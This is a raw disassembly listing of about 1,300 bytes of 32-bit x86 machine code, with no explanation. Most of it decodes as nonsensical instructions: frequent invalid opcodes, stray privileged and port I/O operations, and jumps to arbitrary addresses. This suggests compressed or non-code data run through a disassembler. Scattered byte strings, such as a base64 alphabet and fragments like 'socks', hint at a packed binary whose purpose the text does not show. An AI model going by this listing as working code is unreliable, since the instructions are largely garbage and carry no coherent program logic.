  42bb35:	77 63                	ja     0x42bb9a
  42bb37:	dd ff                	(bad)
  42bb39:	ff                   	(bad)
  42bb3a:	ff                   	(bad)
  42bb3b:	ff                   	(bad)
  42bb3c:	f8                   	clc
  42bb3d:	18 ae 10 b8 dc 81    	sbb    %ch,-0x7e2347f0(%esi)
  42bb43:	b6 62                	mov    $0x62,%dh
  42bb45:	60                   	pusha
  42bb46:	11 13                	adc    %edx,(%ebx)
  42bb48:	40                   	inc    %eax
  42bb49:	d8 d6                	fcom   %st(6)
  42bb4b:	69 cb 02 07 8b a1    	imul   $0xa18b0702,%ebx,%ecx
  42bb51:	71 46                	jno    0x42bb99
  42bb53:	85 4b b2             	test   %ecx,-0x4e(%ebx)
  42bb56:	c8 f5 6a d3          	enter  $0x6af5,$0xd3
  42bb5a:	71 f1                	jno    0x42bb4d
  42bb5c:	16                   	push   %ss
  42bb5d:	ff                   	(bad)
  42bb5e:	ff 4d 6a             	decl   0x6a(%ebp)
  42bb61:	6a 6e                	push   $0x6e
  42bb63:	40                   	inc    %eax
  42bb64:	7d 1f                	jge    0x42bb85
  42bb66:	33 52 8e             	xor    -0x72(%edx),%edx
  42bb69:	61                   	popa
  42bb6a:	6a ab                	push   $0xffffffab
  42bb6c:	ec                   	in     (%dx),%al
  42bb6d:	bf dc 44 14 bf       	mov    $0xbf1444dc,%edi
  42bb72:	aa                   	stos   %al,%es:(%edi)
  42bb73:	03 fe                	add    %esi,%edi
  42bb75:	ff 2f                	ljmp   *(%edi)
  42bb77:	ac                   	lods   %ds:(%esi),%al
  42bb78:	fa                   	cli
  42bb79:	07                   	pop    %es
  42bb7a:	95                   	xchg   %eax,%ebp
  42bb7b:	64 5c                	fs pop %esp
  42bb7d:	93                   	xchg   %eax,%ebx
  42bb7e:	16                   	push   %ss
  42bb7f:	00 09                	add    %cl,(%ecx)
  42bb81:	0a 5c e9 00          	or     0x0(%ecx,%ebp,8),%bl
  42bb85:	b8 5c 4f 0d 4e       	mov    $0x4e0d4f5c,%eax
  42bb8a:	33 ff                	xor    %edi,%edi
  42bb8c:	ff                   	(bad)
  42bb8d:	ff                   	(bad)
  42bb8e:	7f e0                	jg     0x42bb70
  42bb90:	68 f5 ee 53 47       	push   $0x4753eef5
  42bb95:	15 14 0e 16 0a       	adc    $0xa160e14,%eax
  42bb9a:	0c 44                	or     $0x44,%al
  42bb9c:	1c 1c                	sbb    $0x1c,%al
  42bb9e:	23 14 3c             	and    (%esp,%edi,1),%edx
  42bba1:	10 03                	adc    %al,(%ebx)
  42bba3:	0b 0a                	or     (%edx),%ecx
  42bba5:	09 e9                	or     %ebp,%ecx
  42bba7:	fa                   	cli
  42bba8:	b6 f8                	mov    $0xf8,%dh
  42bbaa:	00 0b                	add    %cl,(%ebx)
  42bbac:	00 2f                	add    %ch,(%edi)
  42bbae:	7c e9                	jl     0x42bb99
  42bbb0:	ff 00                	incl   (%eax)
  42bbb2:	08 00                	or     %al,(%eax)
  42bbb4:	03 09                	add    (%ecx),%ecx
  42bbb6:	f5                   	cmc
  42bbb7:	3e 04 b0             	ds add $0xb0,%al
  42bbba:	38 2a                	cmp    %ch,(%edx)
  42bbbc:	5e                   	pop    %esi
  42bbbd:	08 16                	or     %dl,(%esi)
  42bbbf:	07                   	pop    %es
  42bbc0:	6a e9                	push   $0xffffffe9
  42bbc2:	69 09 12 05 b6 fe    	imul   $0xfeb60512,(%ecx),%ecx
  42bbc8:	ff 29                	ljmp   *(%ecx)
  42bbca:	0c 03                	or     $0x3,%al
  42bbcc:	15 1b 1b 38 09       	adc    $0x9381b1b,%eax
  42bbd1:	03 16                	add    (%esi),%edx
  42bbd3:	24 24                	and    $0x24,%al
  42bbd5:	2b 2e                	sub    (%esi),%ebp
  42bbd7:	0a cb                	or     %bl,%cl
  42bbd9:	09 cc                	or     %ecx,%esp
  42bbdb:	ff                   	(bad)
  42bbdc:	ff                   	(bad)
  42bbdd:	ff c2                	inc    %edx
  42bbdf:	86 68 e2             	xchg   %ch,-0x1e(%eax)
  42bbe2:	02 0e                	add    (%esi),%cl
  42bbe4:	00 11                	add    %dl,(%ecx)
  42bbe6:	00 13                	add    %dl,(%ebx)
  42bbe8:	1e                   	push   %ds
  42bbe9:	16                   	push   %ss
  42bbea:	05 25 16 0f 30       	add    $0x300f1625,%eax
  42bbef:	de f3                	fdivp  %st,%st(3)
  42bbf1:	9e                   	sahf
  42bbf2:	10 1e                	adc    %bl,(%esi)
  42bbf4:	03 0d 17 0b 06 c5    	add    0xc5060b17,%ecx
  42bbfa:	5b                   	pop    %ebx
  42bbfb:	ff c2                	inc    %edx
  42bbfd:	45                   	inc    %ebp
  42bbfe:	03 1a                	add    (%edx),%ebx
  42bc00:	f7 ba f8 81 08 1e    	idivl  0x1e0881f8(%edx)
  42bc06:	3a 56 0d             	cmp    0xd(%esi),%dl
  42bc09:	04 15                	add    $0x15,%al
  42bc0b:	5b                   	pop    %ebx
  42bc0c:	e2 df                	loop   0x42bbed
  42bc0e:	be 8f 14 0f 0e       	mov    $0xe0f148f,%esi
  42bc13:	08 1a                	or     %bl,(%edx)
  42bc15:	07                   	pop    %es
  42bc16:	69 7c f2 0c 00 0e 1a 	imul   $0x11a0e00,0xc(%edx,%esi,8),%edi
  42bc1d:	01 
  42bc1e:	63 df                	arpl   %ebx,%edi
  42bc20:	fe                   	(bad)
  42bc21:	ff 5b 94             	lcall  *-0x6c(%ebx)
  42bc24:	6e                   	outsb  %ds:(%esi),(%dx)
  42bc25:	fa                   	cli
  42bc26:	95                   	xchg   %eax,%ebp
  42bc27:	e8 14 07 0e 27       	call   0x2750c340
  42bc2c:	26 03 03             	add    %es:(%ebx),%eax
  42bc2f:	47                   	inc    %edi
  42bc30:	0b 1c 49             	or     (%ecx,%ecx,2),%ebx
  42bc33:	f3 c3                	repz ret
  42bc35:	6b 0d c3 21 7b 03 fe 	imul   $0xfffffffe,0x37b21c3,%ecx
  42bc3c:	16                   	push   %ss
  42bc3d:	12 10                	adc    (%eax),%dl
  42bc3f:	24 27                	and    $0x27,%al
  42bc41:	17                   	pop    %ss
  42bc42:	59                   	pop    %ecx
  42bc43:	19 11                	sbb    %edx,(%ecx)
  42bc45:	ea 7a 35 c2 63 c0 60 	ljmp   $0x60c0,$0x63c2357a
  42bc4c:	40                   	inc    %eax
  42bc4d:	14 de                	adc    $0xde,%al
  42bc4f:	0d 01 ff 85 ff       	or     $0xff85ff01,%eax
  42bc54:	ff 12                	call   *(%edx)
  42bc56:	93                   	xchg   %eax,%ebx
  42bc57:	94                   	xchg   %eax,%esp
  42bc58:	03 21                	add    (%ecx),%esp
  42bc5a:	31 0a                	xor    %ecx,(%edx)
  42bc5c:	94                   	xchg   %eax,%esp
  42bc5d:	65 f5                	gs cmc
  42bc5f:	b8 9d 6e db 07       	mov    $0x7db6e9d,%eax
  42bc64:	06                   	push   %es
  42bc65:	00 09                	add    %cl,(%ecx)
  42bc67:	be 5c b5 57 a2       	mov    $0xa257b55c,%esi
  42bc6c:	36 02 09             	add    %ss:(%ecx),%cl
  42bc6f:	f0 42                	lock inc %edx
  42bc71:	ff                   	(bad)
  42bc72:	ff 85 15 ce cb db    	incl   -0x243431eb(%ebp)
  42bc78:	26 fd                	es std
  42bc7a:	18 04 1b             	sbb    %al,(%ebx,%ebx,1)
  42bc7d:	35 15 02 f7 92       	xor    $0x92f70215,%eax
  42bc82:	31 90 15 45 64 1b    	xor    %edx,0x1b644515(%eax)
  42bc88:	fe                   	(bad)
  42bc89:	ff                   	(bad)
  42bc8a:	bf fc 61 0f 6e       	mov    $0x6e0f61fc,%edi
  42bc8f:	de 45 75             	fiadds 0x75(%ebp)
  42bc92:	1a e5                	sbb    %ch,%ah
  42bc94:	4f                   	dec    %edi
  42bc95:	05 f6 84 69 be       	add    $0xbe6984f6,%eax
  42bc9a:	55                   	push   %ebp
  42bc9b:	32 a5 1b 2b 67 ed    	xor    -0x1298d4e5(%ebp),%ah
  42bca1:	58                   	pop    %eax
  42bca2:	65 ff 37             	push   %gs:(%edi)
  42bca5:	96                   	xchg   %eax,%esi
  42bca6:	fe                   	(bad)
  42bca7:	ea 41 36 92 26 85 ef 	ljmp   $0xef85,$0x26923641
  42bcae:	99                   	cltd
  42bcaf:	61                   	popa
  42bcb0:	0a 5e b7             	or     -0x49(%esi),%bl
  42bcb3:	c0 9b 64 11 56 e9 13 	rcrb   $0x13,-0x16a9ee9c(%ebx)
  42bcba:	c6 c0 ff             	mov    $0xff,%al
  42bcbd:	ff                   	(bad)
  42bcbe:	ff c8                	dec    %eax
  42bcc0:	d1 bd 20 15 e5 2b    	sarl   $1,0x2be51520(%ebp)
  42bcc6:	f0 0d b6 8a a1 ec    	lock or $0xeca18ab6,%eax
  42bccc:	cb                   	lret
  42bccd:	4b                   	dec    %ebx
  42bcce:	09 22                	or     %esp,(%edx)
  42bcd0:	0b 1f                	or     (%edi),%ebx
  42bcd2:	05 47 05 6a 1f       	add    $0x1f6a0547,%eax
  42bcd7:	7b 1e                	jnp    0x42bcf7
  42bcd9:	bf 07 01 be 97       	mov    $0x97be0107,%edi
  42bcde:	4a                   	dec    %edx
  42bcdf:	74 85                	je     0x42bc66
  42bce1:	77 a4                	ja     0x42bc87
  42bce3:	85 01                	test   %eax,(%ecx)
  42bce5:	fa                   	cli
  42bce6:	05 79 21 70 03       	add    $0x3702179,%eax
  42bceb:	96                   	xchg   %eax,%esi
  42bcec:	68 e0 89 9d 3a       	push   $0x3a9d89e0
  42bcf1:	65 bb 6f ff b7 0b    	gs mov $0xbb7ff6f,%ebx
  42bcf7:	98                   	cwtl
  42bcf8:	15 88 05 85 ea       	adc    $0xea850588,%eax
  42bcfd:	fa                   	cli
  42bcfe:	52                   	push   %edx
  42bcff:	86 c8                	xchg   %cl,%al
  42bd01:	fa                   	cli
  42bd02:	ee                   	out    %al,(%dx)
  42bd03:	08 95 00 8f 03 43    	or     %dl,0x43038f00(%ebp)
  42bd09:	c0 6f da fa          	shrb   $0xfa,-0x26(%edi)
  42bd0d:	8d 02                	lea    (%edx),%eax
  42bd0f:	42                   	inc    %edx
  42bd10:	04 de                	add    $0xde,%al
  42bd12:	48                   	dec    %eax
  42bd13:	8e 18                	mov    (%eax),%ds
  42bd15:	f9                   	stc
  42bd16:	14 de                	adc    $0xde,%al
  42bd18:	77 e8                	ja     0x42bd02
  42bd1a:	bd a5 db 01 73       	mov    $0x7301dba5,%ebp
  42bd1f:	66 11 14 c5 0c 76 ea 	adc    %dx,0x15ea760c(,%eax,8)
  42bd26:	15 
  42bd27:	bf fb ff 60 0e       	mov    $0xe60fffb,%edi
  42bd2c:	76 e1                	jbe    0x42bd0f
  42bd2e:	34 cc                	xor    $0xcc,%al
  42bd30:	86 ed                	xchg   %ch,%ch
  42bd32:	06                   	push   %es
  42bd33:	77 08                	ja     0x42bd3d
  42bd35:	c4 e5 0d 3d          	(bad)
  42bd39:	86 f5                	xchg   %dh,%ch
  42bd3b:	fa                   	cli
  42bd3c:	71 71                	jno    0x42bdaf
  42bd3e:	8c ec                	mov    %gs,%esp
  42bd40:	09 3b                	or     %edi,(%ebx)
  42bd42:	b0 c0                	mov    $0xc0,%al
  42bd44:	2f                   	das
  42bd45:	cc                   	int3
  42bd46:	0c 70                	or     $0x70,%al
  42bd48:	25 44 1c a1 fd       	and    $0xfda11c44,%eax
  42bd4d:	84 85 4c 86 c4 07    	test   %al,0x7c4864c(%ebp)
  42bd53:	84 f8                	test   %bh,%al
  42bd55:	f9                   	stc
  42bd56:	f7 da                	neg    %edx
  42bd58:	77 ff                	ja     0x42bd59
  42bd5a:	7f 86                	jg     0x42bce2
  42bd5c:	d4 04                	aam    $0x4
  42bd5e:	88 11                	mov    %dl,(%ecx)
  42bd60:	2a 86 f8 f9 73 0a    	sub    0xa73f9f8(%esi),%al
  42bd66:	8f 07                	pop    (%edi)
  42bd68:	47                   	inc    %edi
  42bd69:	94                   	xchg   %eax,%esp
  42bd6a:	4c                   	dec    %esp
  42bd6b:	70 f2                	jo     0x42bd5f
  42bd6d:	ec                   	in     (%dx),%al
  42bd6e:	66 17                	popw   %ss
  42bd70:	1b fc                	sbb    %esp,%edi
  42bd72:	1b 15 85 11 86 c7    	sbb    0xc7861185,%edx
  42bd78:	01 8c 02 86 c2 0f ec 	add    %ecx,-0x13f03d7a(%edx,%eax,1)
  42bd7f:	ff ad eb fe 01 72    	ljmp   *0x7201feeb(%ebp)
  42bd85:	f4                   	hlt
  42bd86:	04 ca                	add    $0xca,%al
  42bd88:	ec                   	in     (%dx),%al
  42bd89:	49                   	dec    %ecx
  42bd8a:	16                   	push   %ss
  42bd8b:	5b                   	pop    %ebx
  42bd8c:	c9                   	leave
  42bd8d:	75 ec                	jne    0x42bd7b
  42bd8f:	8e 02                	mov    (%edx),%es
  42bd91:	0c c5                	or     $0xc5,%al
  42bd93:	71 40                	jno    0x42bdd5
  42bd95:	8e 5a 5d             	mov    0x5d(%edx),%ds
  42bd98:	6a 37                	push   $0x37
  42bd9a:	f7 01 88 81 35 df    	testl  $0xdf358188,(%ecx)
  42bda0:	b8 f6 55 28 ce       	mov    $0xce2855f6,%eax
  42bda5:	93                   	xchg   %eax,%ebx
  42bda6:	61                   	popa
  42bda7:	95                   	xchg   %eax,%ebp
  42bda8:	f8                   	clc
  42bda9:	6d                   	insl   (%dx),%es:(%edi)
  42bdaa:	db 0b                	fisttpl (%ebx)
  42bdac:	90                   	nop
  42bdad:	8f 45 0d             	pop    0xd(%ebp)
  42bdb0:	1d d9 8c fc 7c       	sbb    $0x7cfc8cd9,%eax
  42bdb5:	02 47 d4             	add    -0x2c(%edi),%al
  42bdb8:	99                   	cltd
  42bdb9:	ed                   	in     (%dx),%eax
  42bdba:	bf 0b 55 42 bc       	mov    $0xbc42550b,%edi
  42bdbf:	52                   	push   %edx
  42bdc0:	4d                   	dec    %ebp
  42bdc1:	f7 ab 50 1d 6d 37    	imull  0x376d1d50(%ebx)
  42bdc7:	02 d7                	add    %bh,%dl
  42bdc9:	e8 b7 6e 56 86       	call   0x86992c85
  42bdce:	c6                   	(bad)
  42bdcf:	0d dd 64 34 c5       	or     $0xc53464dd,%eax
  42bdd4:	c7                   	(bad)
  42bdd5:	af                   	scas   %es:(%edi),%eax
  42bdd6:	60                   	pusha
  42bdd7:	ff                   	lcall  (bad)
  42bdd8:	df b9 76 88 5b f9    	fistpll -0x6a4778a(%ecx)
  42bdde:	0a 35 1b 2e 39 ea    	or     0xea392e1b,%dh
  42bde4:	72 14                	jb     0x42bdfa
  42bde6:	04 c6                	add    $0xc6,%al
  42bde8:	8e 06                	mov    (%esi),%es
  42bdea:	83 c1 c4             	add    $0xffffffc4,%ecx
  42bded:	c5 ba b7 6f b7 15    	lds    0x15b76fb7(%edx),%edi
  42bdf3:	04 04                	add    $0x4,%al
  42bdf5:	f5                   	cmc
  42bdf6:	2c ee                	sub    $0xee,%al
  42bdf8:	e7 21                	out    %eax,$0x21
  42bdfa:	0a f6                	or     %dh,%dh
  42bdfc:	15 63 8e 8c 07       	adc    $0x78c8e63,%eax
  42be01:	3a f7                	cmp    %bh,%dh
  42be03:	ed                   	in     (%dx),%eax
  42be04:	dd 23                	frstor (%ebx)
  42be06:	70 e5                	jo     0x42bded
  42be08:	08 3f                	or     %bh,(%edi)
  42be0a:	dc 8e ab 69 50 90    	fmull  -0x6faf9655(%esi)
  42be10:	f5                   	cmc
  42be11:	89 ff                	mov    %edi,%edi
  42be13:	0e                   	push   %cs
  42be14:	d8 97 be da 55 51    	fcoms  0x5155dabe(%edi)
  42be1a:	6f                   	outsl  %ds:(%esi),(%dx)
  42be1b:	01 56 52             	add    %edx,0x52(%esi)
  42be1e:	fa                   	cli
  42be1f:	d0 88 4b ff b6 7f    	rorb   $1,0x7fb6ff4b(%eax)
  42be25:	43                   	inc    %ebx
  42be26:	4d                   	dec    %ebp
  42be27:	85 25 7a 85 65 2d    	test   %esp,0x2d65857a
  42be2d:	7a 5d                	jp     0x42be8c
  42be2f:	15 55 14 5d 64       	adc    $0x645d1455,%eax
  42be34:	88 41 40             	mov    %al,0x40(%ecx)
  42be37:	fb                   	sti
  42be38:	02 ff                	add    %bh,%bh
  42be3a:	21 85 6f 05 3c c1    	and    %eax,-0x3ec3fa91(%ebp)
  42be40:	70 ff                	jo     0x42be41
  42be42:	e4 85                	in     $0x85,%al
  42be44:	ec                   	in     (%dx),%al
  42be45:	5c                   	pop    %esp
  42be46:	c6                   	(bad)
  42be47:	35 e7 38 40 64       	xor    $0x644038e7,%eax
  42be4c:	ee                   	out    %al,(%dx)
  42be4d:	89 a5 dc 03 86 a4    	mov    %esp,-0x5b79fc24(%ebp)
  42be53:	39 30                	cmp    %esi,(%eax)
  42be55:	13 9c 71 a1 4d 9a 21 	adc    0x219a4da1(%ecx,%esi,2),%ebx
  42be5c:	69 79 aa 81 83 74 dd 	imul   $0xdd748381,-0x56(%ecx),%edi
  42be63:	94                   	xchg   %eax,%esp
  42be64:	00 bf 17 cd 1f dd    	add    %bh,-0x22e032e9(%edi)
  42be6a:	ed                   	in     (%dx),%eax
  42be6b:	cf                   	iret
  42be6c:	30 c8                	xor    %cl,%al
  42be6e:	60                   	pusha
  42be6f:	07                   	pop    %es
  42be70:	eb 0a                	jmp    0x42be7c
  42be72:	71 07                	jno    0x42be7b
  42be74:	ab                   	stos   %eax,%es:(%edi)
  42be75:	ff 5d fd             	lcall  *-0x3(%ebp)
  42be78:	4e                   	dec    %esi
  42be79:	40                   	inc    %eax
  42be7a:	57                   	push   %edi
  42be7b:	4b                   	dec    %ebx
  42be7c:	40                   	inc    %eax
  42be7d:	49                   	dec    %ecx
  42be7e:	ac                   	lods   %ds:(%esi),%al
  42be7f:	41                   	inc    %ecx
  42be80:	49                   	dec    %ecx
  42be81:	49                   	dec    %ecx
  42be82:	05 48 56 53 46       	add    $0x46535648,%eax
  42be87:	57                   	push   %edi
  42be88:	51                   	push   %ecx
  42be89:	b7 e2                	mov    $0xe2,%bh
  42be8b:	b9 b6 d5 97 56       	mov    $0x5697d5b6,%ecx
  42be90:	18 15 0a f5 bb 61    	sbb    %dl,0x61bbf50a
  42be96:	d5 d7                	aad    $0xd7
  42be98:	cd 2f                	int    $0x2f
  42be9a:	49                   	dec    %ecx
  42be9b:	6a 64                	push   $0x64
  42be9d:	61                   	popa
  42be9e:	49                   	dec    %ecx
  42be9f:	6c                   	insb   (%dx),%es:(%edi)
  42bea0:	18 68 0b             	sbb    %ch,0xb(%eax)
  42bea3:	2c 98                	sub    $0x98,%al
  42bea5:	64 62 44 0d 86       	bound  %eax,%fs:-0x7a(%ebp,%ecx,1)
  42beaa:	37                   	aaa
  42beab:	03 07                	add    (%edi),%eax
  42bead:	0e                   	push   %cs
  42beae:	78 31                	js     0x42bee1
  42beb0:	7c 0f                	jl     0x42bec1
  42beb2:	53                   	push   %ebx
  42beb3:	6c                   	insb   (%dx),%es:(%edi)
  42beb4:	76 01                	jbe    0x42beb7
  42beb6:	57                   	push   %edi
  42beb7:	e0 77                	loopne 0x42bf30
  42beb9:	71 70                	jno    0x42bf2b
  42bebb:	1c 13                	sbb    $0x13,%al
  42bebd:	91                   	xchg   %eax,%ecx
  42bebe:	66 71 0f             	data16 jno 0x42bed0
  42bec1:	b0 be                	mov    $0xbe,%al
  42bec3:	6d                   	insl   (%dx),%es:(%edi)
  42bec4:	db 63 16             	(bad) 0x16(%ebx)
  42bec7:	60                   	pusha
  42bec8:	05 46 11 69 4b       	add    $0x4b691146,%eax
  42becd:	60                   	pusha
  42bece:	7d e1                	jge    0x42beb1
  42bed0:	0b 8e 2c 44 87 95    	or     -0x6a78bbd4(%esi),%ecx
  42bed6:	98                   	cwtl
  42bed7:	3e c0 db 8a          	ds rcr $0x8a,%bl
  42bedb:	09 2a                	or     %ebp,(%edx)
  42bedd:	50                   	push   %eax
  42bede:	03 9c 03 bf 69 9a a6 	add    -0x59659641(%ebx,%eax,1),%ebx
  42bee5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42bee6:	ac                   	lods   %ds:(%esi),%al
  42bee7:	b4 bc                	mov    $0xbc,%ah
  42bee9:	63 66 74             	arpl   %esp,0x74(%esi)
  42beec:	63 72 6b             	arpl   %esi,0x6b(%edx)
  42beef:	b6 70                	mov    $0x70,%dh
  42bef1:	57                   	push   %edi
  42bef2:	fc                   	cld
  42bef3:	31 30                	xor    %esi,(%eax)
  42bef5:	2c 66                	sub    $0x66,%al
  42bef7:	6e                   	outsb  %ds:(%esi),(%dx)
  42bef8:	6e                   	outsb  %ds:(%esi),(%dx)
  42bef9:	33 69 67             	xor    0x67(%ecx),%ebp
  42befc:	70 69                	jo     0x42bf67
  42befe:	6e                   	outsb  %ds:(%esi),(%dx)
  42beff:	0f 6b fd             	packssdw %mm5,%mm7
  42bf02:	6f                   	outsl  %ds:(%esi),(%dx)
  42bf03:	5d                   	pop    %ebp
  42bf04:	45                   	inc    %ebp
  42bf05:	f2 52                	repnz push %edx
  42bf07:	70 6d                	jo     0x42bf76
  42bf09:	61                   	popa
  42bf0a:	43                   	inc    %ebx
  42bf0b:	66 66 70 67          	data16 data16 jo 0x42bf76
  42bf0f:	4f                   	dec    %edi
  42bf10:	0f c1 ff             	xadd   %edi,%edi
  42bf13:	6f                   	outsl  %ds:(%esi),(%dx)
  42bf14:	1f                   	pop    %ds
  42bf15:	47                   	inc    %edi
  42bf16:	6c                   	insb   (%dx),%es:(%edi)
  42bf17:	74 6b                	je     0x42bf84
  42bf19:	12 6c 6f 67          	adc    0x67(%edi,%ebp,2),%ch
  42bf1d:	6c                   	insb   (%dx),%es:(%edi)
  42bf1e:	76 54                	jbe    0x42bf74
  42bf20:	63 70 6b             	arpl   %esi,0x6b(%eax)
  42bf23:	63 60 6e             	arpl   %esp,0x6e(%eax)
  42bf26:	67 d9 de             	addr16 (bad)
  42bf29:	ff 2f                	ljmp   *(%edi)
  42bf2b:	f5                   	cmc
  42bf2c:	6b 6c 47 7a 67       	imul   $0x67,0x7a(%edi,%eax,2),%ebp
  42bf31:	61                   	popa
  42bf32:	00 41 6d             	add    %al,0x6d(%ecx)
  42bf35:	72 7b                	jb     0x42bfb2
  42bf37:	44                   	inc    %esp
  42bf38:	6b 11 2b             	imul   $0x2b,(%ecx),%edx
  42bf3b:	51                   	push   %ecx
  42bf3c:	6b 6f 85 58          	imul   $0x58,-0x7b(%edi),%ebp
  42bf40:	0a a5 25 60 77 76    	or     0x76776025(%ebp),%ah
  42bf46:	3f                   	aas
  42bf47:	14 cf                	adc    $0xcf,%al
  42bf49:	da 9b bb 50 67 65    	ficompl 0x656750bb(%ebx)
  42bf4f:	16                   	push   %ss
  42bf50:	37                   	aaa
  42bf51:	6e                   	outsb  %ds:(%esi),(%dx)
  42bf52:	77 67                	ja     0x42bfbb
  42bf54:	2f                   	das
  42bf55:	0f 4d 72 db          	cmovge -0x25(%edx),%esi
  42bf59:	ee                   	out    %al,(%dx)
  42bf5a:	bf 6f 49 49 67       	mov    $0x6749496f,%edi
  42bf5f:	7b 43                	jnp    0x42bfa4
  42bf61:	0b 41 6e             	or     0x6e(%ecx),%eax
  42bf64:	6d                   	insl   (%dx),%es:(%edi)
  42bf65:	71 67                	jno    0x42bfce
  42bf67:	0c 00                	or     $0x0,%al
  42bf69:	6a 34                	push   $0x34
  42bf6b:	72 6b                	jb     0x42bfd8
  42bf6d:	d4 6e                	aam    $0x6e
  42bf6f:	ed                   	in     (%dx),%eax
  42bf70:	38 2d 2d 36 5d 6b    	cmp    %ch,0x6b5d362d
  42bf76:	69 63 59 5f bd 5b fc 	imul   $0xfc5bbd5f,0x59(%ebx),%esp
  42bf7d:	76 6b                	jbe    0x42bfea
  42bf7f:	71 47                	jno    0x42bfc8
  42bf81:	63 76 6d             	arpl   %esi,0x6d(%esi)
  42bf84:	70 2c                	jo     0x42bfb2
  42bf86:	c4 6f 2d             	les    0x2d(%edi),%ebp
  42bf89:	9b                   	fwait
  42bf8a:	f6 c3 fe             	test   $0xfe,%bl
  42bf8d:	85 23                	test   %esp,(%ebx)
  42bf8f:	6f                   	outsl  %ds:(%esi),(%dx)
  42bf90:	63 6c 63 65          	arpl   %ebp,0x65(%ebx,%eiz,2)
  42bf94:	67 1d 6f 6c 64 5f    	addr16 sbb $0x5f646c6f,%eax
  42bf9a:	a2 e4 60 5f 81       	mov    %al,0x815f60e4
  42bf9f:	a0 27 5d 00 00       	mov    0x5d27,%al
  42bfa4:	5f                   	pop    %edi
  42bfa5:	db fe                	(bad)
  42bfa7:	77 a1                	ja     0x42bf4a
  42bfa9:	2b 60 65             	sub    0x65(%eax),%esp
  42bfac:	77 6e                	ja     0x42c01c
  42bfae:	6c                   	insb   (%dx),%es:(%edi)
  42bfaf:	6d                   	insl   (%dx),%es:(%edi)
  42bfb0:	2d 66 7b 66 0b       	sub    $0xb667b66,%eax
  42bfb5:	77 e7                	ja     0x42bf9e
  42bfb7:	50                   	push   %eax
  42bfb8:	fe                   	(bad)
  42bfb9:	6f                   	outsl  %ds:(%esi),(%dx)
  42bfba:	7f 6b                	jg     0x42c027
  42bfbc:	68 77 2a 61 7c       	push   $0x7c612a77
  42bfc1:	d6                   	salc
  42bfc2:	00 70 62             	add    %dh,0x62(%eax)
  42bfc5:	66 25 25 38          	and    $0x3825,%ax
  42bfc9:	72 7a                	jb     0x42c045
  42bfcb:	7a 5a                	jp     0x42c027
  42bfcd:	f7 fc                	idiv   %esp
  42bfcf:	bf 33 3a 5c 73       	mov    $0x735c3a33,%edi
  42bfd4:	74 6f                	je     0x42c045
  42bfd6:	70 00                	jo     0x42bfd8
  42bfd8:	66 6c                	data16 insb (%dx),%es:(%edi)
  42bfda:	69 62 75 9b 6c d4 7b 	imul   $0x7bd46c9b,0x75(%edx),%esp
  42bfe1:	0f 85 11 32 4b 14    	jne    0x148df1f8
  42bfe7:	41                   	inc    %ecx
  42bfe8:	76 d4                	jbe    0x42bfbe
  42bfea:	de 25 7b 4f 98 0f    	fisubs 0xf984f7b
  42bff0:	57                   	push   %edi
  42bff1:	70 6e                	jo     0x42c061
  42bff3:	12 13                	adc    (%ebx),%dl
  42bff5:	77 fb                	ja     0x42bff2
  42bff7:	0e                   	push   %cs
  42bff8:	ad                   	lods   %ds:(%esi),%eax
  42bff9:	ef                   	out    %eax,(%dx)
  42bffa:	d7                   	xlat   %ds:(%ebx)
  42bffb:	20 13                	and    %dl,(%ebx)
  42bffd:	70 c1                	jo     0x42bfc0
  42bfff:	6c                   	insb   (%dx),%es:(%edi)
  42c000:	6c                   	insb   (%dx),%es:(%edi)
  42c001:	07                   	pop    %es
  42c002:	ae                   	scas   %es:(%edi),%al
  42c003:	c4 66 7e             	les    0x7e(%esi),%esp
  42c006:	66 73 6f             	data16 jae 0x42c078
  42c009:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  42c00c:	5c                   	pop    %esp
  42c00d:	61                   	popa
  42c00e:	f3 07                	repz pop %es
  42c010:	5d                   	pop    %ebp
  42c011:	61                   	popa
  42c012:	b7 fc                	mov    $0xfc,%bh
  42c014:	6d                   	insl   (%dx),%es:(%edi)
  42c015:	69 6e 69 61 76 70 72 	imul   $0x72707661,0x69(%esi),%ebp
  42c01c:	72 61                	jb     0x42c07f
  42c01e:	21 23                	and    %esp,(%ebx)
  42c020:	25 fe ff cf 76       	and    $0x76cffffe,%eax
  42c025:	d5 72                	aad    $0x72
  42c027:	00 03                	add    %al,(%ebx)
  42c029:	41                   	inc    %ecx
  42c02a:	42                   	inc    %edx
  42c02b:	43                   	inc    %ebx
  42c02c:	44                   	inc    %esp
  42c02d:	45                   	inc    %ebp
  42c02e:	46                   	inc    %esi
  42c02f:	47                   	inc    %edi
  42c030:	48                   	dec    %eax
  42c031:	49                   	dec    %ecx
  42c032:	4a                   	dec    %edx
  42c033:	4b                   	dec    %ebx
  42c034:	4c                   	dec    %esp
  42c035:	4d                   	dec    %ebp
  42c036:	4e                   	dec    %esi
  42c037:	4f                   	dec    %edi
  42c038:	50                   	push   %eax
  42c039:	51                   	push   %ecx
  42c03a:	f1                   	int1
  42c03b:	ff ad 85 0b 54 cc    	ljmp   *-0x33abf47b(%ebp)
  42c041:	57                   	push   %edi
  42c042:	58                   	pop    %eax
  42c043:	59                   	pop    %ecx
  42c044:	5a                   	pop    %edx
  42c045:	61                   	popa
  42c046:	62 63 64             	bound  %esp,0x64(%ebx)
  42c049:	65 66 67 68 ff ed    	gs addr16 pushw $0xedff
  42c04f:	76 6b                	jbe    0x42c0bc
  42c051:	8f                   	(bad)
  42c052:	9c                   	pushf
  42c053:	6d                   	insl   (%dx),%es:(%edi)
  42c054:	6e                   	outsb  %ds:(%esi),(%dx)
  42c055:	ae                   	scas   %es:(%edi),%al
  42c056:	71 72                	jno    0x42c0ca
  42c058:	41                   	inc    %ecx
  42c059:	75 76                	jne    0x42c0d1
  42c05b:	77 78                	ja     0x42c0d5
  42c05d:	79 7a                	jns    0x42c0d9
  42c05f:	30 31                	xor    %dh,(%ecx)
  42c061:	fb                   	sti
  42c062:	f6 be f4 32 33 34    	idivb  0x343332f4(%esi)
  42c068:	35 5e 38 39 2b       	xor    $0x2b39385e,%eax
  42c06d:	2f                   	das
  42c06e:	7b d8                	jnp    0x42c048
  42c070:	25 30 32 58 ef       	and    $0xef583230,%eax
  42c075:	2b e5                	sub    %ebp,%esp
  42c077:	6e                   	outsb  %ds:(%esi),(%dx)
  42c078:	9d                   	popf
  42c079:	0b 6e 23             	or     0x23(%esi),%ebp
  42c07c:	73 65                	jae    0x42c0e3
  42c07e:	58                   	pop    %eax
  42c07f:	e7 6e                	out    %eax,$0x6e
  42c081:	0a 0b                	or     (%ebx),%cl
